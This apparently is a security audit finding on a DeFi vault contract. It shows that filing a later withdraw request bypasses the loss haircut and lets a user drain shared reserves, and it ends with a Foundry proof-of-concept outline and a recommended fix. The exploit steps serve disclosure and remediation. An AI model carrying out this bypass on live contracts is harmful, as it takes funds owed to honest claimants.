### Title
Loss-adjusted withdraw receipts are paid at par after any later `requestWithdraw` — haircut bypass drains funded reserves - (File: contracts/strategies/idle/IdleCreditVault.sol)

### Summary
The external report is an unsafe-input-handling bug: attacker-supplied data reaches a code path that was supposed to be guarded. The analog in `IdleCreditVault` is a loss-epoch bypass: `_claimLossAdjustedWithdrawRequest` only ever inspects `lossRecoveryPriceByEpoch[lastWithdrawRequest[_user]]`, i.e. the user's *latest* request epoch. By simply submitting one more `requestWithdraw` in a later healthy epoch, a user shifts `lastWithdrawRequest` past the loss epoch, the haircut lookup returns 0, and `_claimFundedWithdrawRequest` pays the full aggregated `withdrawsRequests[_user]` basis at par — including the portion that `collectWithdrawFunds` deliberately underfunded.

### Finding Description
When `stopEpochWithDuration` realizes a loss, `collectWithdrawFunds` collects only `pendingToFund < pendingBasis` from the borrower, stores `lossRecoveryPriceByEpoch[epochNumber]`, and zeroes `pendingWithdraws` (lines 411-425). The intent is that affected receipts claim `claimBasis * lossRecoveryPrice / RECOVERY_FULL` via `_claimLossAdjustedWithdrawRequest` (lines 789-800).

The bug is that the loss-claim path is keyed exclusively to `lastWithdrawRequest[_user]`:

- `requestWithdraw` always overwrites `lastWithdrawRequest[_user] = currentEpoch` and accumulates into `withdrawsRequests[_user]` (lines 279-294).
- `withdrawsRequestsByEpoch` and `withdrawsRequests` for the loss epoch are never cleared by `collectWithdrawFunds`; they persist.
- On claim, `_claimLossAdjustedWithdrawRequest` reads `lossRecoveryPriceByEpoch[lastWithdrawRequest[_user]]`. If the user made any subsequent request in epoch M > N, the lookup hits epoch M (no loss price) and returns 0.
- `_claimFundedWithdrawRequest` then computes `normalAmount = withdrawsRequests[_user]` (which still includes the epoch-N underfunded basis), burns the user's receipt tokens (they hold 1:1 receipts for every request), and calls `_transferFundedClaim(_user, amount)` at par (lines 338-349). `_transferFundedClaim` only guards `defaultRecoveryReserve`, not the loss haircut (lines 897-907).

So the epoch-N haircut is silently dropped and the user is paid in full from the strategy's funded underlyings.

### Impact Explanation
Direct theft plus insolvency. For each loss-epoch-N basis `B` and recovery price `p < RECOVERY_FULL`, the attacker extracts `B * (1 - p/RECOVERY_FULL)` more than entitled. That excess comes from underlyings funded for other users' receipts; when those users later claim, `_transferFundedClaim` reverts on insufficient balance, so the shortfall is permanently socialized onto honest claimants (last claimants can be frozen out entirely). Broken invariant: loss waterfall / one receipt one payout.

### Likelihood Explanation
The attacker only needs to be a KYC-passing wallet (`isWalletAllowed` on `requestWithdraw`) holding tranche tokens when a `stopEpochWithDuration(_lossAmount > 0)` event occurs — a normal, anticipated protocol operation for impaired credit. The exploit steps (`requestWithdraw` in a later epoch, then `claimWithdrawRequest`) are ordinary unprivileged user calls in the buffer/stopped phase; no privileged cooperation is needed. Existing guards (`NotAllowed` epoch gating, reserve guard, per-epoch ledgers) all pass because every ledger lookup resolves to the *latest* epoch, which is clean.

### Recommendation
Track loss-adjusted basis per epoch and clear it independently of `lastWithdrawRequest`. In `claimWithdrawRequest`, iterate (or check) all epochs with nonzero `withdrawsRequestsByEpoch[_user][e]` where `lossRecoveryPriceByEpoch[e] != 0`, or store a per-user set/marker of loss epochs. At minimum, `collectWithdrawFunds` should record which epochs were haircut and `_claimFundedWithdrawRequest` must exclude any `withdrawsRequestsByEpoch` entries belonging to those epochs.

### Proof of Concept
Foundry fork test outline (pattern follows `testStopEpochWithDuration` in `test/foundry/IdleCreditVault.t.sol`):

```solidity
function testLossHaircutBypass() external {
  // setup: alice and bob deposit AA, epoch 0 runs normally
  idleCDO.depositAA(10_000 * ONE_SCALE); // alice (this)
  vm.prank(bob); idleCDO.depositAA(10_000 * ONE_SCALE);
  _startEpochAndCheckPrices(0);

  // alice requests withdraw during epoch 0 buffer/start of epoch 1
  uint256 reqA = cdoEpoch.requestWithdraw(0, address(AAtranche));
  // bob requests as well so funded reserves are shared
  vm.prank(bob); uint256 reqB = cdoEpoch.requestWithdraw(0, address(BBtranche));

  // epoch 0 ends with a realized loss: borrower funds only pendingToFund < pendingBasis
  vm.warp(cdoEpoch.epochEndDate() + 1);
  vm.prank(manager);
  cdoEpoch.stopEpochWithDuration(0, 0, 7 days, lossAmount); // lossRecoveryPriceByEpoch[0] < 1

  // instead of claiming (which would apply the haircut via lastWithdrawRequest == 0),
  // alice files a NEW request in epoch 1, moving lastWithdrawRequest to 1
  uint256 aliceShares = AAtranche.balanceOf(alice);
  // alice re-deposits or keeps residual shares, then:
  cdoEpoch.requestWithdraw(dustAmount, address(AAtranche)); // lastWithdrawRequest[alice] = 1

  // epoch 1 ends fully funded
  _startEpochAndCheckPrices(1);
  vm.warp(cdoEpoch.epochEndDate() + 1);
  vm.prank(manager); cdoEpoch.stopEpoch(0, 0);

  // claim: _claimLossAdjustedWithdrawRequest checks epoch 1 -> price 0 -> skipped
  // _claimFundedWithdrawRequest pays withdrawsRequests[alice] = reqA + dust at par
  uint256 balPre = underlying.balanceOf(alice);
  vm.prank(alice); cdoEpoch.claimWithdrawRequest();
  uint256 paid = underlying.balanceOf(alice) - balPre;

  // alice received the FULL epoch-0 basis instead of reqA * lossRecoveryPrice / RECOVERY_FULL
  assertGt(paid, reqA * strategy.lossRecoveryPriceByEpoch(0) / RECOVERY_FULL + dustAmount);

  // bob's later claim now reverts/shortfalls: funded reserve was drained by the haircut escape
  vm.prank(bob);
  vm.expectRevert(); // or assertEq(paidBob < reqB * price)
  cdoEpoch.claimWithdrawRequest();
}
```

Key assertions: `strategy.withdrawsRequests(alice)` still contains the epoch-0 basis after `collectWithdrawFunds` underfunds it; `lossRecoveryPriceByEpoch[1] == 0` causes the haircut path to be skipped; the excess paid equals `reqA * (1 - lossRecoveryPrice/RECOVERY_FULL)`, which is borne by bob's claim.
